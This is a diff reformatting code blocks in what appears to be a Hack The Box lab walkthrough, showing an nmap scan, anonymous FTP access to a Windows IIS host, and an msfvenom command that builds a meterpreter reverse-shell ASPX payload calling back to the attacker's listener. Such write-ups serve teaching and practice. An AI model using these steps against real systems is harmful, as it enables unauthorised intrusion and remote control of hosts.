@@ -28,7 +28,9 @@ Suppose we are hypothetically allowed to call anything we want from the web serv
 ### **Scanning the Target**
 
 ```
-th1nyunb0y@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5<SNIP>
+th1nyunb0y@htb[/htb]$ nmap -sV -T4 -p- 10.10.10.5
+
+<SNIP>
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     Microsoft ftpd
 80/tcp open  http    Microsoft IIS httpd 7.5
@@ -38,7 +40,9 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ### **FTP Anonymous Access**
 
 ```
-th1nyunb0y@htb[/htb]$ ftp 10.10.10.5Connected to 10.10.10.5.
+th1nyunb0y@htb[/htb]$ ftp 10.10.10.5
+
+Connected to 10.10.10.5.
 220 Microsoft FTP Service
 
 Name (10.10.10.5:root): anonymous
@@ -65,7 +69,9 @@ Noticing the aspnet_client, we realize that the box will be able to run `.aspx`
 ### **Generating Payload**
 
 ```
-th1nyunb0y@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+th1nyunb0y@htb[/htb]$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x86 from the payload
 No encoder or badchars specified, outputting raw payload
 Payload size: 341 bytes
